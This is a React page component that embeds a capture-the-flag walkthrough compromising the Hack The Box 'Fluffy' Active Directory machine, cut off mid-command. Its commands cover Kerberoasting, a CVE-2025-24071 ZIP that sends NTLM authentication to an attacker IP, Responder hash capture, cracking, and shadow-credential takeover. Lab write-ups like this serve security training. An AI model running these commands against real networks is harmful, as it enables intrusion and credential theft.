import React from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import './FluffyWalkthrough.css';

const FluffyWalkthrough = () => {
  const navigate = useNavigate();
  // Fluffy Walkthrough data
  const writeup = {
    id: 'fluffy-walkthrough',
    title: 'Fluffy Walkthrough',
    excerpt: 'Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the winrm_svc and ca_svc accounts. WinRM can then be used to log in to the target using the winrc_svc account. Exploitation of an Active Directory Certificate service (ESC16) using the ca_svc account is required to obtain access to the Administrator account.',
    date: 'Sep 20, 2025',
    tags: ['Htb', 'Ad', 'Smb', 'Ldap', 'Windows', 'Password-Cracking', 'Kerberoasting'],
    difficulty: 'Easy',
    os: 'Windows',
    ip: '10.129.202.248',
    content: `# Fluffy Walkthrough

## Overview
Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting [CVE-2025-24071](https://nvd.nist.gov/vuln/detail/CVE-2025-24071), the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the \`winrm_svc\` and \`ca_svc\` accounts. \`WinRM\` can then be used to log in to the target using the \`winrc_svc\` account. Exploitation of an Active Directory Certificate service (\`ESC16\`) using the \`ca_svc\` account is required to obtain access to the \`Administrator\` account.
<InfoStatus title="Info Status:" message="As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!" />

## Enumeration
### Portscanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows machine with \`Active Directory\` services. The scan reveals several critical ports including LDAP (389, 636, 3268, 3269), Kerberos (88), SMB (445, 139), and WinRM (5985), which are typical indicators of an Active Directory Domain Controller.
\`\`\`bash
sudo nmap -vv -sS -Pn -sV -sC -p- --min-rate=10000 10.129.202.248 -oN nmap/log.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-25 02:01:30Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T02:03:02+00:00; +7h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-25T02:03:03+00:00; +7h00m03s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-25T02:03:02+00:00; +7h00m03s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T02:03:03+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49744/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28774/tcp): CLEAN (Timeout)
|   Check 2 (port 9400/tcp): CLEAN (Timeout)
|   Check 3 (port 6407/udp): CLEAN (Timeout)
|   Check 4 (port 59729/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-05-25T02:02:26
|_  start_date: N/A
|_clock-skew: mean: 7h00m03s, deviation: 0s, median: 7h00m02s
\`\`\`

### Service Enumeration
Executing the \`netexec\` tool and enumerating the shared smb folders. This will help us identify accessible shares and understand the file system structure available to our low-privileged user account.
\`\`\`bash
nxc smb 10.129.246.108 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/1.png)

Making a collection on Active Directory with \`bloodhound-python\`. This tool will map out the entire Active Directory structure, including users, groups, computers, and their relationships, which is crucial for understanding potential attack paths and privilege escalation opportunities.
\`\`\`bash
faketime "$(ntpdate -q 10.129.246.108 | cut -d ' ' -f 1,2)" bloodhound-python -u "j.fleischman" -p 'J0elTHEM4n1990!' -d fluffy.htb -ns 10.129.246.108 -dc DC01.fluffy.htb -c ALL --zip
\`\`\`

On the \`IT\` shared folder, that our user have read and write privileges, we gonna find some files and a \`.pdf\` file. The IT share is particularly interesting as it often contains sensitive information and may provide clues about vulnerabilities or misconfigurations within the environment.
\`\`\`bash
smbclient.py 'j.fleischman:J0elTHEM4n1990!'@10.129.246.108
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/2.png)

Enumerating all users from Active Directory, filtering and saving into the \`users.txt\` file. This comprehensive user enumeration will help us identify potential targets for further exploitation and understand the organizational structure of the domain.
\`\`\`bash
nxc smb 10.129.246.108 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute
cat a | grep "SidTypeUser" | awk -F " " '{print $6}' | cut -d '\\' -f 2 > users.txt
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/3.png)
![Kerbrute User Enumeration](/images/writeups/fluffy/4.png)

## Foothold
### Exploitation
With impacket tool, we gonna see that \`j.fleischman\` user can kerberoast to some services accounts, but we cannot crack these ticket hashes. Kerberoasting is a technique that allows us to request service tickets for service accounts, which can then be cracked offline to obtain plaintext passwords. However, in this case, the hashes are not crackable with standard wordlists.
\`\`\`bash
faketime "$(ntpdate -q 10.129.246.108 | cut -d ' ' -f 1,2)" GetUserSPNs.py fluffy.htb/'j.fleischman:J0elTHEM4n1990!' -dc-ip DC01.fluffy.htb -request
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/5.png)

On the pdf we gonna find information about some CVEs. This document contains valuable information about recent vulnerabilities that could be exploited in the current environment, providing us with potential attack vectors.
![Kerbrute User Enumeration](/images/writeups/fluffy/6.png)

We can generate a malicious \`.zip\` file that explores the \`Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)\`. This vulnerability allows attackers to create specially crafted ZIP files that, when opened in Windows File Explorer, can trigger NTLM authentication requests to attacker-controlled servers, potentially leading to credential theft.

\`\`\`
https://github.com/ThemeHackers/CVE-2025-24071
\`\`\`
\`\`\`bash
python3 exploit.py -f exploit.zip -i 10.10.14.18
\`\`\`

Uploading the zip file to the shared folder. Since we have write access to the IT share, we can place our malicious file there, hoping that another user with higher privileges will open it.
\`\`\`
smbclient.py 'j.fleischman:J0elTHEM4n1990!'@10.129.71.158
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/7.png)

Executing and opening an smb server with \`Responder\` tool we will receive the \`p.agila\` NTLMv2 hash. Responder is a tool that listens for various network protocols and can capture authentication attempts, including NTLM hashes when users interact with our malicious file.
\`\`\`bash
sudo responder -I tun0 -v 
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/8.png)

Cracking \`p.agila\` hash. Using Hashcat with the rockyou wordlist, we attempt to crack the captured NTLMv2 hash to obtain the plaintext password for the p.agila account.
\`\`\`bash
hashcat -a 0 agilahash /usr/share/wordlists/rockyou.txt
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/9.png)

Validating \`p.agila\` password. We verify that the cracked password works by attempting to authenticate with the p.agila account using the obtained credentials.
\`\`\`bash
nxc smb 10.129.71.158 -u 'p.agila' -p 'prom<REDACTED>'
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/10.png)

## Post-Exploitation
### Lateral Movement - GenericAll & GenericWrite
We can see that the user \`p.agile\` have GenericAll into the \`Service Accounts\` group. GenericAll is a powerful Active Directory permission that grants full control over an object, including the ability to modify group membership, which we can leverage for privilege escalation.
![Kerbrute User Enumeration](/images/writeups/fluffy/11.png)

As \`p.agila\` user have GenericAll into the \`Service Accounts\` group, we can add him to the group. By adding ourselves to the Service Accounts group, we gain access to additional privileges and can potentially access service account credentials that are stored in Active Directory.
\`\`\`bash
net rpc group addmem 'SERVICE ACCOUNTS' "p.agila" -U "fluffy.htb"/"p.agila"%"prom<REDACTED>" -S "DC01.fluffy.htb"
net rpc group members "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"prom<REDACTED>" -S "DC01.fluffy.htb"
\`\`\`
![Kerbrute User Enumeration](/images/writeups/fluffy/12.png)

### User Flag
The users on \`Service Accounts\` group have GenericWrite to the services accounts. GenericWrite permission allows us to modify the attributes of service accounts, including their passwords, which is exactly what we need to extract their credentials.
![Kerbrute User Enumeration](/images/writeups/fluffy/13.png)

With certipy, we gonna retrieve the \`winrm_svc\` credential. Certipy is a powerful tool for Active Directory Certificate Services exploitation that can extract service account credentials using various techniques, including shadow credentials and certificate-based attacks.
\`\`\`bash
certipy shadow auto -u p.agila@DC01.fluffy.htb -p 'prom<REDACTED>' -dc-ip 10.129.71.158 -account ca_svc
